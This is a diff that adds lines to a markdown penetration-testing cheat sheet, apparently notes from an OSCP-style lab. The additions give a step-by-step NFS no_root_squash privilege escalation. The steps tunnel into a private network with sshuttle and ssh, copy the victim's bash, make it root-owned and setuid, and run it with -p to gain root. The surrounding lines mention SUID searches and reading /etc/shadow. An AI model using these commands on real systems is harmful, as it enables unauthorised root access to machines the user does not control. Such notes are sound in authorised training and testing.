@@ -723,6 +723,10 @@ find / -perm -4000 -user root -exec ls -ld {} \; 2> /dev/null
 ````
 cat /etc/crontab
 ````
+### NFS
+````
+cat /etc/exports
+````
 ## Windows System Enumeration <img src="https://cdn-icons-png.flaticon.com/512/232/232411.png" width="40" height="40" />
 ### Windows Binaries
 ````
@@ -979,6 +983,7 @@ gcc memodipper.c -o memodipper #compile on the target not kali
 ````
 ### NFS Shares
 #### cat /etc/exports
+##### no_root_squash
 ````
 Files created via NFS inherit the remote user’s ID. If the user is root, and root squashing is enabled, the ID will instead be set to the “nobody” user.
 
@@ -990,8 +995,21 @@ Notice that the /srv share has root squashing disabled. Because of this, on our 
 
 "no_root_squash"
 ````
+##### Setup
 ````
-
+sshuttle -r sea@10.11.1.251 10.1.1.0/24 #setup
+ssh -L 6070:127.0.0.1:2049 megan@10.1.1.27 -N #tunnel for 127.0.0.1 /srv/Share
+mkdir /mnt/tmp
+scp megan@10.1.1.27:/bin/bash . #copy over a reliable version of bash from the victim
+chown root:root bash; chmod +s bash #change ownership and set sticky bit
+ssh megan@10.1.1.27 #login to victim computer
+````
+##### Exploit
+````
+cd /srv/Share
+ls -la #check for sticky bit
+./bash -p #how to execute with stick bit
+whoami
 ````
 ### Bad File permissions
 #### cat /etc/shadow
